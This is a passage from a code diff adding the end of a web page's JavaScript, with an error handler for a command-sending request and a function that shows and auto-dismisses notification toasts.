+                document.getElementById('commandResult').innerHTML =
+                    `<div class="alert alert-danger">✗ Error: ${error.message}</div>`;
+                showNotification('error', 'Error sending command');
+            })
+            .finally(() => {
+                buttons.forEach(btn => btn.disabled = false);
+            });
+        }
+
+        function showNotification(type, message) {
+            const container = document.getElementById('notificationContainer');
+            const notification = document.createElement('div');
+            notification.className = `notification ${type}`;
+            notification.innerHTML = `
+                <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
+                <span>${message}</span>
+                <button class="close-btn" onclick="this.parentElement.remove()">
+                    <i class="fas fa-times"></i>
+                </button>
+            `;
+
+            container.appendChild(notification);
+
+            setTimeout(() => {
+                if (notification.parentElement) {
+                    notification.style.animation = 'slideOut 0.3s ease';
+                    setTimeout(() => notification.remove(), 300);
+                }
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
